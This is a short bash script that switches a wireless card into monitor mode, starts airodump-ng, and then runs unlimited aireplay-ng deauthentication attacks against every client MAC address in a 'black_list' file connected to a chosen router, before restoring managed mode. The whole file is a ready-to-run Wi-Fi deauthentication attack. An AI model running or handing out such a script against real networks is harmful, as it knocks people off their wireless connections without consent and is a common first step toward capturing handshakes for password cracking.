#!/bin/bash

router_mac=$(sudo cat ROUTER/BSSID.txt)
interface=$(sudo cat ROUTER/IF.txt)
macs="store/black_list/file.txt"


sudo ifconfig "$interface" down
sudo airmon-ng check kill
sudo iwconfig "$interface" mode monitor
sudo ifconfig "$interface" up
x-terminal-emulator -e sudo airodump-ng "$interface"
./deauth_2.sh


for val in $(cat "$macs")
do
x-terminal-emulator -e sudo aireplay-ng -0 0 -a "$router_mac" -c "$val" "$interface" 
# echo -e "\t$val"
done


sudo ifconfig "$interface" down
sudo iwconfig "$interface" mode managed
sudo service NetworkManager restart
